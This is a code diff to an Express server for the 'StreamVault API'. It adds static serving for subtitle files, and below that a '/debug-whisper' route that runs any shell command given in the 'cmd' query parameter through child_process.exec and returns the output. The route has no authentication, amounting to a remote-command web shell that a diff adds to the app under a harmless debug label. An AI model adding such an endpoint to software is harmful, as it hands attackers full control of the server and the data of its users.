@@ -62,6 +62,18 @@ app.use('/uploads/hls', express.static(path.join(__dirname, '../uploads/hls'), {
   },
 }));
 
+// Subtitles: served statically with VTT mime-type
+app.use('/uploads/subtitles', express.static(path.join(__dirname, '../uploads/subtitles'), {
+  maxAge: '1d',
+  setHeaders: (res, filePath) => {
+    if (filePath.endsWith('.vtt')) {
+      res.setHeader('Content-Type', 'text/vtt');
+    } else if (filePath.endsWith('.srt')) {
+      res.setHeader('Content-Type', 'text/plain');
+    }
+  },
+}));
+
 // ── General Rate Limiter ──────────────────────────────────────────────────────
 app.use('/api', generalLimiter);
 // app.get('/api/demo', (req, res) => {
@@ -86,6 +98,19 @@ app.get('/', (req, res) => {
     message: 'Welcome to StreamVault API',
     docs: '/api/v1/health',
     version: '1.0.0',
+  });
+});
+
+// ── Debug Whisper ─────────────────────────────────────────────────────────────
+app.get('/debug-whisper', (req, res) => {
+  const { exec } = require('child_process');
+  const cmd = req.query.cmd || 'echo "no cmd"';
+  exec(cmd, (err, stdout, stderr) => {
+    res.json({
+      stdout: stdout.trim(),
+      stderr: stderr.trim(),
+      error: err ? err.message : null
+    });
   });
 });
 
